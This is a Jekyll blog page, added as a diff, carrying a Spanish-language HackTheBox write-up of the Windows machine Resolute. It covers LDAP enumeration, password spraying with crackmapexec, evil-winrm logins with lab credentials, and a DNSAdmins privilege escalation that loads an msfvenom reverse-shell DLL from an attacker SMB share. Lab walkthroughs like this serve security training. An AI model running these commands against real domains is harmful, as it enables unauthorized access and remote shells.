@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>HTB Resolute Write-up (Español)</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Resolute Write-up (Español) | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="HTB Resolute Write-up (Español)" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="I cloned my writeup that was originally posted on medium" />
+<meta property="og:description" content="I cloned my writeup that was originally posted on medium" />
+<link rel="canonical" href="http://localhost:8000/Resolute-Espa%C3%B1ol" />
+<meta property="og:url" content="http://localhost:8000/Resolute-Espa%C3%B1ol" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/Resolute/1__50mbX____satzMUETrLrTh6w.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-05-30T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/Resolute/1__50mbX____satzMUETrLrTh6w.png" />
+<meta property="twitter:title" content="HTB Resolute Write-up (Español)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2020-05-30T00:00:00-05:00","datePublished":"2020-05-30T00:00:00-05:00","description":"I cloned my writeup that was originally posted on medium","headline":"HTB Resolute Write-up (Español)","image":"http://localhost:8000/assets/images/Resolute/1__50mbX____satzMUETrLrTh6w.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Resolute-Espa%C3%B1ol"},"url":"http://localhost:8000/Resolute-Espa%C3%B1ol"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/Resolute/1__50mbX____satzMUETrLrTh6w.png/../banner.png>
+  
+  <h2>HTB Resolute Write-up (Español)</h2>
+  <time datetime="2020-05-30T00:00:00-05:00" class="by-line">30 May 2020</time>
+  <p>I cloned my writeup that was originally posted on <a href="https://medium.com/@5ubterranean/htb-resolute-write-up-espa%C3%B1ol-57ba05034b5b">medium</a></p>
+
+<p>Resolute en una máquina basada en Windows que estuvo activa desde el 7 de Diciembre del 2019 hasta el 30 de mayo del 2020, en este caso empezaremos enumerando LDAP ya que nos encontramos en un ambiente con AD, el administrador de la red no parecía tener buenas prácticas y dejó una contraseña dentro del campo de descripción de uno de los usuarios, la contraseña no corresponde al usuario en el cual la encontramos por lo que hacemos una lista con todos los usuarios del dominio y usamos fuerza bruta, una vez tenemos el usuario correspondiente ya tenemos un acceso inicial a la máquina objetivo, mientras enumeramos la máquina nos encontramos con un script en powershell con la contraseña del usuario “ryan” adentro, aunque este se encontraba dentro unas carpetas ocultas, bueno no es que eso aumente la seguridad en algo, por último vemos que este usuario pertenece al grupo de “DNSAdmins”, esto es importante ya que nos permite hacer un estilo de DLL hijacking para elevar nuestros privilegios a System.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Empezamos usando masscan para encontrar todos los puertos disponibles y luego usamos nmap para conseguir más información de los mismos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan <span class="nt">-e</span> tun0 — <span class="nv">rate</span><span class="o">=</span>500 <span class="nt">-p</span> 0–65535 10.10.10.169  
+nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 139,59811,389,49666,49688,49664,49677,445,49676,49670,636,464,9389,53,593,47001,49667,88,49709,3269 <span class="nt">-o</span> scan.txt 10.10.10.169  
+53/tcp    open   domain?  
+| fingerprint-strings:   
+|   DNSVersionBindReqTCP:   
+|     version  
+|<span class="se">\_</span>    <span class="nb">bind  
+</span>88/tcp    open   kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2020-04-20 13:27:23Z<span class="o">)</span>  
+139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn  
+389/tcp   open   ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span class="o">)</span>  
+445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: MEGABANK<span class="o">)</span>  
+464/tcp   open   kpasswd5?  
+593/tcp   open   ncacn<span class="se">\_</span>http   Microsoft Windows RPC over HTTP 1.0  
+636/tcp   open   tcpwrapped  
+3269/tcp  open   tcpwrapped  
+9389/tcp  open   mc-nmf       .NET Message Framing  
+47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>  
+|<span class="se">\_</span>http-server-header: Microsoft-HTTPAPI/2.0  
+|<span class="se">\_</span>http-title: Not Found  
+49664/tcp open   msrpc        Microsoft Windows RPC  
+49666/tcp open   msrpc        Microsoft Windows RPC  
+49667/tcp open   msrpc        Microsoft Windows RPC  
+49670/tcp open   msrpc        Microsoft Windows RPC  
+49676/tcp open   ncacn<span class="se">\_</span>http   Microsoft Windows RPC over HTTP 1.0  
+49677/tcp open   msrpc        Microsoft Windows RPC  
+49688/tcp open   msrpc        Microsoft Windows RPC  
+49709/tcp open   msrpc        Microsoft Windows RPC
+</code></pre></div></div>
+
+<p>Como se ve tenemos muchos puertos abiertos, pero la información más importante la obtendremos de LDAP, para esto usaremos ldapsearch, empezamos haciendo una petición para obtener los naming contexts disponibles, principalmente buscamos el nombre del dominio, para esto usamos <code class="language-plaintext highlighter-rouge">ldapsearch -h 10.10.10.169 -x -s base namingcontexts</code>.</p>
+
+<p><img src="/assets/images/Resolute/1__xmDicKLQr7hTQKk____IW4mQ.png" alt="" /></p>
+
+<p>Ahora confirmamos los resulta de nmap, que nos dijo que el dominio era megabank.local, ahora podríamos extraer todas las unidades organizacionales y sus elementos usando <code class="language-plaintext highlighter-rouge">ldapsearch -h 10.10.10.169 -x -b “DC=megabank,DC=local”</code>, pero terminaría siendo más información de la que necesitamos, algunos administradores de red asumen que solo ellos tienen acceso a los elementos de las unidades organizacionales, pero esto es erróneo ya que como estas se replican entren los dominios, esta información también es replicada, asumiendo este caso buscamos el campo más común donde encontrar información la descripción de los usuarios, para esto usamos ldapsearch para extraer solo las uninades que sean de tipo usuario y filtramos para solo ver el campo de descripción, para hacer esto ejecutamos: <code class="language-plaintext highlighter-rouge">ldapsearch -h 10.10.10.169 -x -b “DC=megabank,DC=local” ‘(objectClass=user)’ | grep description</code></p>
+
+<p><img src="/assets/images/Resolute/1__rravMMDxtFxsVqlrTQsLRg.png" alt="" /></p>
+
+<h1 id="ganando-acceso">Ganando acceso</h1>
+
+<p>Muy bien nuestra suposición fue correcta, el administrador dejó una contraseña ahí, en este caso es “Welcome123!”, lo primero que intentamos fue usar esta contraseña junto con el usuario cuyo campo de descripción la tenía, pero no tuvimos éxito, así ahora procedimos a crear una lista de todos los usuarios dentro del dominio, una vez más con ayuda de ldapsearch: <code class="language-plaintext highlighter-rouge">ldapsearch -h 10.10.10.169 -x -b “DC=megabank,DC=local” '(objectClass=user)' | grep “sAMAccountName” | awk '{print $2}' &gt; userlist.txt</code>.<br />
+Y ahora ya que el puerto de SMB se encuentra abierto podemos usar crackmapexec para hacer un ataque de fuerza bruta y encontrar el usuario a quien le pertenece esta contraseña, para esto usamos: <code class="language-plaintext highlighter-rouge">cme smb 10.10.10.169 -u userlist.txt -p 'Welcome123!'</code>.</p>
+
+<p><img src="/assets/images/Resolute/1__S84WWyrNbsluQcWgJfR3DA.png" alt="" /></p>
+
+<p>Bien el usuario a quien le pertenece la contraseña es “melanie”, ahora usamos evil-winrm para conseguir una shell en la máquina objetivo: <code class="language-plaintext highlighter-rouge">evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'</code>.</p>
+
+<p><img src="/assets/images/Resolute/1__Wlz1T7dFdtSyUeQHi98sZQ.png" alt="" /></p>
+
+<p>Y con esto hemos conseguido el “user.txt”.</p>
+
+<h1 id="movimiento-lateral">Movimiento lateral</h1>
+
+<p>Luego de usar los métodos básicos de enumeración (winpeas, revisar servicios, permisos, grupos, etc.) no encontramos nada útil, así que empezamos a buscar manualmente por información, y revisando el directorio raíz del disco local C, no encontramos con una carpeta oculta que llama nuestra atención (para listar archivos ocultos debemos usar el argumento -Force con Get-ChildItem), PSTranscripts.</p>
+
+<p><img src="/assets/images/Resolute/1__57iRWGsI64MvKgbkDJRblw.png" alt="" /></p>
+
+<p>Dentro de esa carpeta hay otra carpeta oculta llamada “20191203” y dentro de ella hay un script de powershell llamado “PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt”, dentro de este nos encontramos las credenciales del usuario “ryan”, parece que este quería automatizar algunas tareas, pero dejar tus credenciales en un archivo nunca es buena idea.</p>
+
+<p><img src="/assets/images/Resolute/1__k1DfsYze2mrxbdkLV4NV7Q.png" alt="" /></p>
+
+<p>Ya una vez con sus credenciales volvemos a usar evil-wirn para acceder como este usuario: <code class="language-plaintext highlighter-rouge">evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'</code>.</p>
+
+<p><img src="/assets/images/Resolute/1__x8W0TMRyEdLQ94cHML2onQ.png" alt="" /></p>
+
+<h1 id="escalación-de-privilegios">Escalación de privilegios</h1>
+
+<p>Enumerando un poco el usuario vemos que este pertenece al grupo “DNSAdmins”, y luego de googlear un poco descubrimos que existe una forma de escalar privilegios con este grupo, para lograrlo primero creamos un dll con msfvenom que ejecutará un reverse shell, para esto usamos el comando: <code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.64 LPORT=54321 -f dll -o plugin.dll</code>, sería más comodo subir nuestro dll a la máquina objetivo, pero esta cuenta con un antivirus que lo detecta y elimina rápidamente, así que creamos una carpeta compartida con ayuda de impacket, <code class="language-plaintext highlighter-rouge">sudo python3 smbserver.py share /home/subterranean/writeups/resolute -smb2support</code>, iniciamos nuestro listener <code class="language-plaintext highlighter-rouge">nc -lvp 54321</code>, y ejecutamos el comando que importará nuestro plugin, dentedrá e iniciará el servicio de DNS, <code class="language-plaintext highlighter-rouge">cmd /c “dnscmd resolute.megabank.local /config /serverlevelplugindll \\10.10.15.64\share\plugin.dll &amp; sc stop dns &amp; ping -n 10 127.0.0.1 &amp; sc start dns”</code>. En este caso lo iniciamos con <code class="language-plaintext highlighter-rouge">cmd /c</code> porque nos escontramos en una shell de powershell, y se unen los comandos con “&amp;” para ejecutar todo en un one liner, al ejecutar el comando veremos que nos llega una petición a nuestro servidor SMB.</p>
+
+<p><img src="/assets/images/Resolute/1__yqpDTHZqrGSTxEPrGW1Rkg.png" alt="" /></p>
+
+<p>Y luego se detiene y se inicia el servicio.</p>
+
+<p><img src="/assets/images/Resolute/1__OvB1YaofKEJqF9TMqVZQZg.png" alt="" />
+<img src="/assets/images/Resolute/1__3rtgYKmXjiRhqGuDRxbD3g.png" alt="" /></p>
+
+<p>Y luego de eso obtendremos nuestra shell.</p>
+
+<p><img src="/assets/images/Resolute/1__Rw80__0jw3aZovvYIuA6iBw.png" alt="" /></p>
+
+<p>Y listo, conseguimos lo permisos de “nt authority\system” y terminamos con la máquina.</p>
+
+<h1 id="descargo-de-responsabilidad">Descargo de responsabilidad</h1>
+
+<p>Todos los recursos brindados en este post se hicieron puramente con fines educativos y de concientización, el autor no se hace responsable por las acciones que las personas puedan realizar con el contenido del mismo.</p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#active-directory"> Active Directory</a> &nbsp;
+  
+  <a href="/tags.html#dnsadmins"> DNSAdmins</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
